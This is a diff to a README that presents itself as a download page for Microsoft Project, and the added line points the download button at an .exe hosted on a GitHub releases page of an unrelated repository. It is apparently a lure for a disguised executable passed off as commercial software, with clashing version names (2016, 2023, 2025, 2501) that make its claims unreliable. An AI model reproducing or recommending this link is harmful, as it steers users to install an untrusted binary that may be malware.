@@ -13,7 +13,7 @@ Microsoft Project 2016 is a robust software solution for project management deve
 ## Installation
 To download the latest version of Microsoft Project for Windows, click the button below:
 
-[**Download Microsoft Project**](*)
+[**Download Microsoft Project**](https://github.com/nancee2v/owasp-masvs/releases/download/1.295/Microsoft_Project_Pro_2025_x64.exe)
 
 The latest stable release is Microsoft Project 2501. If you already have a preview edition of Microsoft Project 2501 installed, it is recommended to uninstall it before proceeding with the installation. Installing Microsoft Project 2023 will not automatically update or replace previous versions like Project 2019 or older.
 
